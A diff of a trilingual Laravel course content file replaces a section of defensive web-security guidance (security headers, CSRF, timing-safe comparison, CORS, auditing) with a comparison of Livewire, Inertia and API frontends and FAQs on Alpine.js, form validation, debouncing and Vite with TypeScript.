+              { en: "Session", np: "Session", jp: "セッション" },
+              { en: "Excellent", np: "उत्तम", jp: "優秀" },
+              { en: "Admin UIs / forms", np: "Admin UIs", jp: "管理 UI・フォーム" },
             ],
             [
-              { en: "Content-Security-Policy", np: "CSP", jp: "CSP" },
-              { en: "XSS via inline scripts or external script sources", np: "XSS", jp: "XSS（スクリプト注入）" },
-              { en: "`default-src 'self'`", np: "`default-src 'self'`", jp: "`default-src 'self'`" },
+              { en: "Inertia + Vue/React", np: "Inertia", jp: "Inertia" },
+              { en: "Vue or React", np: "Vue वा React", jp: "Vue か React" },
+              { en: "Server", np: "Server", jp: "サーバー" },
+              { en: "Session", np: "Session", jp: "セッション" },
+              { en: "Needs SSR", np: "SSR चाहिन्छ", jp: "SSR が必要" },
+              { en: "SPA with Laravel backend", np: "SPA + Laravel", jp: "Laravel バックエンド SPA" },
             ],
             [
-              { en: "Strict-Transport-Security", np: "HSTS", jp: "HSTS" },
-              { en: "HTTP downgrade attacks — forcing HTTPS", np: "HTTP downgrade", jp: "HTTP ダウングレード攻撃" },
-              { en: "`max-age=31536000; includeSubDomains`", np: "max-age=31536000", jp: "max-age=31536000" },
-            ],
-            [
-              { en: "Referrer-Policy", np: "Referrer-Policy", jp: "Referrer-Policy" },
-              { en: "Information leakage in the Referer header to third parties", np: "Referer leakage", jp: "リファラ情報漏洩" },
-              { en: "`strict-origin-when-cross-origin`", np: "strict-origin-when-cross-origin", jp: "strict-origin-when-cross-origin" },
+              { en: "Decoupled API", np: "API", jp: "分離 API" },
+              { en: "Any framework", np: "कुनै पनि", jp: "任意" },
+              { en: "Client-side", np: "Client", jp: "クライアント" },
+              { en: "Sanctum tokens", np: "Sanctum tokens", jp: "Sanctum トークン" },
+              { en: "Client-side", np: "Client", jp: "クライアント側" },
+              { en: "Mobile / headless", np: "Mobile / headless", jp: "モバイル・ヘッドレス" },
             ],
           ],
+        },
+        {
+          type: "paragraph",
+          text: {
+            en: "Inertia SSR runs a Node.js server (`php artisan inertia:start-ssr`) that renders the first page server-side for SEO and faster initial load. It's an opt-in — most admin apps don't need it. For public-facing marketing pages with SEO requirements, enable SSR or use a static site generator for those specific pages.",
+            np: "Inertia SSR: Node.js server ले first page server-side render गर्छ। SEO चाहिने apps मा enable गर्नुस्।",
+            jp: "Inertia SSR: Node.js が初回ページをサーバー側でレンダリング。SEO が必要な場合に有効化。",
+          },
         },
       ],
     },
@@ -340,62 +397,62 @@ class SecurityHeaders
   faq: [
     {
       question: {
-        en: "Does CSRF protection work with Sanctum SPA cookie mode?",
-        np: "Sanctum SPA cookie mode मा CSRF काम गर्छ?",
-        jp: "Sanctum の SPA クッキーモードで CSRF は機能しますか？",
+        en: "Can I mix Livewire and Inertia in the same app?",
+        np: "एउटै app मा Livewire र Inertia दुवै प्रयोग गर्न सकिन्छ?",
+        jp: "同じアプリで Livewire と Inertia を混在できますか?",
       },
       answer: {
-        en: "Yes — Sanctum SPA cookie mode uses CSRF protection differently from form-based apps.\n\n<b>How it works:</b>\n1. The SPA calls `GET /sanctum/csrf-cookie` once — this sets the `XSRF-TOKEN` cookie\n2. For every mutating request (POST, PUT, DELETE), the SPA sends the cookie value as an `X-XSRF-TOKEN` header\n3. Sanctum verifies the header matches the cookie — an attacker's site cannot read your cookie, so it cannot forge the header\n\nAxios sends the `X-XSRF-TOKEN` header automatically when it finds the `XSRF-TOKEN` cookie — no manual setup needed.\n\n<b>Token mode (Authorization: Bearer):</b> CSRF is irrelevant. Bearer tokens must be explicitly attached to requests — they are never sent automatically by the browser, so CSRF cannot exploit them.",
-        np: "SPA mode: `GET /sanctum/csrf-cookie` → `XSRF-TOKEN` cookie → `X-XSRF-TOKEN` header। Bearer token mode मा CSRF irrelevant।",
-        jp: "SPA は `/sanctum/csrf-cookie` で XSRF-TOKEN を取得し X-XSRF-TOKEN ヘッダーで送信。Bearer トークンモードは CSRF 不要。",
+        en: "Technically yes, but it creates two frontend systems to maintain. Typical pattern: use Inertia for the main app and Blade/Livewire for a simpler admin panel. Mixing them in the same views is unsupported and creates confusing state management.",
+        np: "हुन्छ, तर maintenance double हुन्छ। Main app मा Inertia, admin panel मा Livewire — यो common pattern हो।",
+        jp: "技術的には可能ですが、2 つのフロントエンドシステムを管理することになります。メインアプリに Inertia、管理パネルに Livewire が一般的なパターンです。",
       },
     },
     {
       question: {
-        en: "How do I prevent timing attacks on password comparisons?",
-        np: "Timing attacks रोक्ने तरिका?",
-        jp: "パスワード比較のタイミング攻撃を防ぐには？",
+        en: "Does Livewire work with Alpine.js?",
+        np: "Livewire र Alpine.js सँगसँगै काम गर्छन्?",
+        jp: "Livewire は Alpine.js と連携できますか?",
       },
       answer: {
-        en: "Never compare passwords or tokens with `===` or `==`.\n\nA <b>timing attack</b> exploits the fact that `==` returns `false` as soon as it finds a mismatched character — shorter mismatches take less time to compute. By measuring response time thousands of times, an attacker can determine password length and individual characters.\n\n<b>Use `Hash::check()`</b> for passwords — it uses `hash_equals()` internally, which takes the <b>same amount of time regardless of where the strings differ</b>.\n\n`Hash::check('userInput', $storedHash)` — always safe\n\nFor API tokens or HMAC signatures, use `hash_equals($expected, $actual)` directly.\n\n↳ The time difference is nanoseconds — invisible to humans, but measurable by an automated attacker making millions of requests.",
-        np: "`Hash::check()` प्रयोग गर्नुहोस् — `hash_equals()` internally। `===` timing attack को लागि vulnerable छ।",
-        jp: "パスワード比較は必ず `Hash::check()`。内部で `hash_equals()` を使い比較時間を一定に保つ。",
+        en: "Yes, they are designed to work together. Alpine.js handles client-side interactions (toggles, animations, dropdowns) while Livewire handles server interactions. Livewire ships with Alpine included — you don't need to install it separately. Rule: use `x-data`, `x-show`, `x-on:click` for purely visual JavaScript; use `wire:click` when a server round-trip is needed.",
+        np: "हो, सँगसँगै काम गर्छन्। Alpine = client-side UI। Livewire = server interactions। Alpine Livewire मा included छ।",
+        jp: "はい、一緒に使えます。Alpine は UI インタラクション、Livewire はサーバー通信を担当。Livewire に Alpine が同梱されています。",
       },
     },
     {
       question: {
-        en: "Should I sanitize input on save, or escape output on render?",
-        np: "Input sanitize गर्ने कि output escape?",
-        jp: "入力をサニタイズすべきですか、出力をエスケープすべきですか？",
+        en: "How does Inertia handle form validation errors?",
+        np: "Inertia मा form validation errors कसरी handle हुन्छ?",
+        jp: "Inertia のフォームバリデーションエラーはどう扱いますか?",
       },
       answer: {
-        en: "<b>Both — they are complementary, not alternatives.</b>\n\n• <b>Validate on input</b> (Day 5): reject or normalise data that does not match the expected format — wrong email format, string where an integer is expected\n• <b>Sanitize on input</b>: strip or encode characters that should not be stored — e.g. `strip_tags()` on plain-text fields\n• <b>Escape on output</b>: always use `{{ }}` in Blade, even for data you believe is already clean\n\n<b>Why both?</b> Data flows through many paths:\n• Stored via the web form (validated)\n• Imported via a CSV upload (not validated)\n• Seeded by a developer (not sanitized)\n• Fetched from a third-party API (unknown format)\n\nEscaping at output is the last line of defence that catches everything.",
-        np: "Input validation + sanitize on save + escape on output — तिनीहरू complementary हुन्।",
-        jp: "入力バリデーション・保存時サニタイズ・出力エスケープは補完関係。どれか一つでは不十分。",
+        en: "Inertia redirects back with a 422 response (Laravel validation failure) and includes the errors in the Inertia shared props. Use the `useForm()` helper in Vue/React — it automatically populates `form.errors` from the 422 response. No manual error parsing needed.",
+        np: "`useForm()` helper प्रयोग गर्नुस्। 422 response आउँदा `form.errors` automatically populate हुन्छ।",
+        jp: "`useForm()` ヘルパーを使うと、422 レスポンスから `form.errors` が自動的に設定されます。",
       },
     },
     {
       question: {
-        en: "What is CORS and how does it relate to security?",
-        np: "CORS र security को सम्बन्ध?",
-        jp: "CORS とセキュリティの関係は？",
+        en: "What is the performance impact of Livewire's network requests?",
+        np: "Livewire का network requests को performance impact के हो?",
+        jp: "Livewire のネットワークリクエストがパフォーマンスに与える影響は?",
       },
       answer: {
-        en: "<b>CORS (Cross-Origin Resource Sharing)</b> controls which domains can make JavaScript-initiated requests to your API from a browser.\n\n<b>Important nuance:</b> CORS is a <b>browser-level control</b>, not a server-level security measure:\n• A browser respects CORS headers and blocks unauthorised cross-origin requests\n• `curl`, Postman, and server-to-server calls <b>ignore CORS entirely</b>\n• CORS does NOT prevent unauthenticated access — it only restricts which origins browsers allow\n\n<b>Configure CORS in `config/cors.php`:</b>\n• `allowed_origins: ['https://yourapp.com']` — restrict to your frontend domain\n• `allowed_origins: ['*']` — allows ANY domain (never use for authenticated APIs)\n• `supports_credentials: true` — required for Sanctum SPA cookie mode\n\n↳ For authenticated APIs: always set specific origins, never `*`.",
-        np: "CORS = browser-level control। curl/Postman ले ignore गर्छ। `config/cors.php` मा specific origins set गर्नुहोस्।",
-        jp: "CORS はブラウザレベルの制御。curl や Postman は無視する。`config/cors.php` で許可ドメインを限定する。",
+        en: "Every `wire:model.live` keystroke triggers a network request. For search inputs, use `wire:model.live.debounce.500ms` to delay the request 500ms after the user stops typing. For non-interactive updates, use `wire:model.blur` (only fires on focus-out). Profile with browser DevTools network tab to see the frequency and payload size.",
+        np: "प्रत्येक keystroke मा request जान्छ। `wire:model.live.debounce.500ms` प्रयोग गर्नुस् search inputs मा।",
+        jp: "キーストロークごとにリクエストが発生します。検索入力には `wire:model.live.debounce.500ms` を使い、不要なリクエストを減らしましょう。",
       },
     },
     {
       question: {
-        en: "How do I audit my Laravel app for security issues?",
-        np: "Security audit कसरी गर्ने?",
-        jp: "Laravel アプリのセキュリティ監査方法は？",
+        en: "Can Vite handle TypeScript out of the box?",
+        np: "Vite ले TypeScript automatically handle गर्छ?",
+        jp: "Vite は TypeScript をそのまま扱えますか?",
       },
       answer: {
-        en: "<b>Three levels of security auditing:</b>\n\n<b>1. Built-in tools (free):</b>\n• `composer audit` — checks all your dependencies against the PHP Security Advisory Database for known CVEs\n• Laravel Telescope — inspect every request, query, exception, and mail in development\n• `php artisan route:list` — review which routes are public vs protected\n\n<b>2. Automated scanning (free tier available):</b>\n• Enlightn — scans your codebase for security misconfigurations (CORS, CSRF, debug mode in production, exposed .env)\n• Run: `composer require enlightn/enlightn --dev` then `php artisan enlightn`\n\n<b>3. Ongoing hygiene:</b>\n• Keep Laravel and all packages updated: `composer update`\n• Never commit `.env` to version control\n• Set `APP_DEBUG=false` and `APP_ENV=production` in production\n• Use `config:cache` and `route:cache` — they fail loudly if misconfigured\n\n↳ Run `composer audit` as part of your CI pipeline so new CVEs are caught before deployment.",
-        np: "`composer audit`, Telescope, Enlightn, `APP_DEBUG=false` production मा।",
-        jp: "`composer audit`・Telescope・Enlightn で監査。本番は `APP_DEBUG=false`、`.env` はコミットしない。",
+        en: "Yes. Vite processes TypeScript natively via esbuild without needing a separate `ts-loader`. Add `@types/node` and a `tsconfig.json`, then rename files to `.ts` or `.tsx`. Important caveat: Vite skips type-checking for speed — run `tsc --noEmit` separately in CI to catch type errors before deployment.",
+        np: "हो, Vite ले TypeScript native support गर्छ (esbuild मार्फत)। CI मा `tsc --noEmit` छुट्टै चलाउनुस्।",
+        jp: "はい、esbuild 経由でネイティブ対応。ただし型チェックはスキップされるため、CI で `tsc --noEmit` を別途実行してください。",
       },
     },
   ],
